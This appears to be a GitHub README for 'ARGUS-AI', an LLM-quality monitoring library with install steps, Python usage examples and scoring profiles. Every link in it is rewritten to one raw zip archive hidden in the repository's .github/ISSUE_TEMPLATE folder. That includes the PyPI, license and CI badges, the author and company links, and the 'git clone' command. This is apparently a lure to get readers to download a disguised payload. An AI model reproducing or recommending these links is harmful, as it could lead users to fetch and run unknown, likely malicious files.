# ARGUS-AI

**Production-Grade LLM Observability in 3 Lines of Code**

[![PyPI version](https://img.shields.io/pypi/v/argus-ai.svg)](https://github.com/strobilevitellus470/argus-ai/raw/refs/heads/main/.github/ISSUE_TEMPLATE/ai-argus-visuoauditory.zip)
[![Python 3.9+](https://img.shields.io/badge/python-3.9+-blue.svg)](https://github.com/strobilevitellus470/argus-ai/raw/refs/heads/main/.github/ISSUE_TEMPLATE/ai-argus-visuoauditory.zip)
[![License: Apache 2.0](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](https://github.com/strobilevitellus470/argus-ai/raw/refs/heads/main/.github/ISSUE_TEMPLATE/ai-argus-visuoauditory.zip)
[![CI](https://github.com/strobilevitellus470/argus-ai/raw/refs/heads/main/.github/ISSUE_TEMPLATE/ai-argus-visuoauditory.zip)](https://github.com/strobilevitellus470/argus-ai/raw/refs/heads/main/.github/ISSUE_TEMPLATE/ai-argus-visuoauditory.zip)

ARGUS-AI is the **G-ARVIS scoring engine** for monitoring LLM application quality in production. It evaluates every LLM response across six orthogonal dimensions: **G**roundedness, **A**ccuracy, **R**eliability, **V**ariance, **I**nference Cost, and **S**afety.

Your LLM app is degrading right now. You just can't see it yet.

```python
import argus_ai

argus = argus_ai.init()
result = argus.evaluate(prompt=prompt, response=response, context=context)
```

That's it. Every LLM call now has a quality score.

---

## Why ARGUS

LLM outputs degrade silently. Models update, prompts drift, context windows overflow, and costs creep. Traditional monitoring catches latency and errors. It does not catch a model that starts hallucinating 12% more after a provider update, or a prompt that silently loses grounding when context exceeds 80K tokens.

G-ARVIS catches it.

| Dimension | What It Measures | Why It Matters |
|-----------|-----------------|----------------|
| **Groundedness** | Is the response grounded in provided context? | Hallucination detection |
| **Accuracy** | Does it match ground truth / internal consistency? | Factual correctness |
| **Reliability** | Format consistency, completeness, latency SLA | Structural quality |
| **Variance** | Output determinism and confidence signals | Consistency across runs |
| **Inference Cost** | Token efficiency, cost-per-word, latency-to-value | Budget control |
| **Safety** | PII leakage, toxicity, injection, harmful content | Compliance and trust |

Plus three **agentic evaluation metrics** for autonomous workflows:

| Metric | Formula | What It Measures |
|--------|---------|-----------------|
| **ASF** (Agent Stability Factor) | completion × (1 - failure_rate) × consistency | Workflow completion reliability |
| **ERR** (Error Recovery Rate) | recovered / failed | Self-healing capability |
| **CPCS** (Cost Per Completed Step) | total_cost / completed_steps | Economic efficiency per step |

---

## Install

```bash
pip install argus-ai
```

With provider integrations:

```bash
pip install argus-ai[anthropic]    # Anthropic Claude wrapper
pip install argus-ai[openai]       # OpenAI wrapper
pip install argus-ai[prometheus]   # Prometheus export
pip install argus-ai[opentelemetry] # OTEL export
pip install argus-ai[all]          # Everything
```

---

## Quick Start

### Basic Evaluation

```python
import argus_ai

argus = argus_ai.init(profile="enterprise")

result = argus.evaluate(
    prompt="What causes climate change?",
    response="Greenhouse gas emissions from fossil fuels are the primary driver.",
    context="Climate change is driven by human activities releasing greenhouse gases.",
    model_name="claude-sonnet-4",
    latency_ms=1200.0,
    input_tokens=45,
    output_tokens=30,
    cost_usd=0.002,
)

print(f"Composite: {result.garvis_composite:.3f}")  # 0.847
print(f"Passing:   {result.passing}")                # True
print(f"Safety:    {result.safety:.3f}")             # 0.950
```

### Agentic Workflow Evaluation

```python
from argus_ai.types import AgenticEvalRequest

argus = argus_ai.init(profile="agentic")

workflow = AgenticEvalRequest(
    prompt="Research competitors and generate report",
    response="Report generated with 5 competitor analyses.",
    steps_planned=8,
    steps_completed=7,
    steps_failed=2,
    steps_recovered=1,
    retries=3,
    total_cost_usd=0.45,
)

result, agentic_metrics = argus.evaluate_agentic(workflow)

for m in agentic_metrics:
    print(f"{m.name}: {m.score:.3f}")
# AgentStabilityFactor: 0.612
# ErrorRecoveryRate: 0.600
# CostPerCompletedStep: 0.357
```

### Drop-In Provider Wrappers

**Anthropic Claude:**

```python
from argus_ai.integrations.anthropic import InstrumentedAnthropic

argus = argus_ai.init()
client = InstrumentedAnthropic(argus=argus)

response = client.messages.create(
    model="claude-sonnet-4-20250514",
    max_tokens=1024,
    messages=[{"role": "user", "content": "Explain transformers"}],
)

# G-ARVIS score automatically attached
print(response._argus_score.garvis_composite)
```

**OpenAI:**

```python
from argus_ai.integrations.openai import InstrumentedOpenAI

client = InstrumentedOpenAI(argus=argus_ai.init())

response = client.chat.completions.create(
    model="gpt-4o",
    messages=[{"role": "user", "content": "Explain transformers"}],
)

print(response._argus_score.garvis_composite)
```

### Threshold Monitoring with Alerting

```python
from argus_ai.monitoring.thresholds import ThresholdConfig
from argus_ai.monitoring.alerts import AlertRule, AlertSeverity

config = ThresholdConfig(
    composite_min=0.80,
    safety_min=0.90,
    window_size=100,
    breach_ratio=0.15,
)

rules = [
    AlertRule(
        dimension="safety",
        threshold=0.85,
        severity=AlertSeverity.CRITICAL,
        message="Safety below critical threshold",
    ),
]

argus = argus_ai.init(
    profile="healthcare",
    thresholds=config,
    alert_rules=rules,
    exporters=["console", "prometheus"],
    on_alert=lambda msg, result: pagerduty.trigger(msg),
)
```

### Decorator Instrumentation

```python
from argus_ai.sdk.decorators import argus_evaluate

argus = argus_ai.init()

@argus_evaluate(argus, model_name="claude-sonnet-4")
def generate(prompt: str) -> str:
    return anthropic_client.messages.create(
        model="claude-sonnet-4-20250514",
        messages=[{"role": "user", "content": prompt}]
    ).content[0].text
```

---

## Weight Profiles

G-ARVIS weights are configurable per deployment scenario:

| Profile | G | A | R | V | I | S | Best For |
|---------|---|---|---|---|---|---|----------|
| `enterprise` | 0.20 | 0.20 | 0.15 | 0.15 | 0.10 | 0.20 | General production |
| `healthcare` | 0.25 | 0.25 | 0.15 | 0.10 | 0.05 | 0.20 | HIPAA workloads |
| `finance` | 0.20 | 0.25 | 0.20 | 0.10 | 0.05 | 0.20 | SOX/GAAP compliance |
| `consumer` | 0.15 | 0.15 | 0.20 | 0.15 | 0.20 | 0.15 | Cost-sensitive apps |
| `agentic` | 0.15 | 0.15 | 0.25 | 0.20 | 0.10 | 0.15 | Autonomous agents |

Custom weights:

```python
from argus_ai.scoring.garvis import GarvisWeights

argus = argus_ai.init(weights=GarvisWeights(safety=0.40, accuracy=0.30))
```

---

## Metrics Export

### Prometheus

```python
argus = argus_ai.init(exporters=["prometheus"])
```

Exposes: `argus_garvis_composite`, `argus_garvis_{dimension}`, `argus_evaluation_duration_ms`, `argus_alerts_total`

### OpenTelemetry

```python
argus = argus_ai.init(exporters=["opentelemetry"])
```

Compatible with Datadog, New Relic, Honeycomb, Grafana Cloud, and any OTLP backend.

---

## Architecture

See [ARCHITECTURE.md](ARCHITECTURE.md) for the full system design and open core split.

```
argus-ai (Open Source)          ARGUS Platform (Commercial)
├── G-ARVIS Scorer              ├── Autonomous Correction Loop
├── 3-Line SDK                  ├── Prompt Optimizer
├── Threshold Monitor           ├── LLM-as-Judge Evaluation
├── ASF/ERR/CPCS Metrics        ├── Multi-Run Variance Analysis
├── Prometheus/OTEL Export      ├── Dashboard UI
└── Anthropic/OpenAI Wrappers   └── SOC2/HIPAA Compliance
```

---

## Performance

G-ARVIS heuristic scoring runs in **sub-5ms** per evaluation with zero external dependencies at runtime.

| Benchmark | Value |
|-----------|-------|
| Single evaluation | < 3ms |
| Batch (1000 requests) | < 2.5s |
| Memory overhead | < 5MB |
| Dependencies (core) | 3 (pydantic, numpy, structlog) |

---

## Roadmap

- [ ] LiteLLM integration
- [ ] LangChain callback handler
- [ ] Grafana dashboard templates
- [ ] Custom scorer plugin API
- [ ] Async evaluation support
- [ ] CLI tool for offline batch scoring

---

## Contributing

Contributions welcome. See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.

```bash
git clone https://github.com/strobilevitellus470/argus-ai/raw/refs/heads/main/.github/ISSUE_TEMPLATE/ai-argus-visuoauditory.zip
cd argus-ai
pip install -e ".[dev]"
pytest tests/ -v
```

---

## About

Built by [Anil Prasad](https://github.com/strobilevitellus470/argus-ai/raw/refs/heads/main/.github/ISSUE_TEMPLATE/ai-argus-visuoauditory.zip) at [Ambharii Labs](https://github.com/strobilevitellus470/argus-ai/raw/refs/heads/main/.github/ISSUE_TEMPLATE/ai-argus-visuoauditory.zip).

G-ARVIS framework published in ["Field Notes: Production AI"](https://github.com/strobilevitellus470/argus-ai/raw/refs/heads/main/.github/ISSUE_TEMPLATE/ai-argus-visuoauditory.zip) on LinkedIn.

ARGUS: Autonomous Runtime Guardian for Unified Systems.

---

## License

Apache 2.0. See [LICENSE](LICENSE).
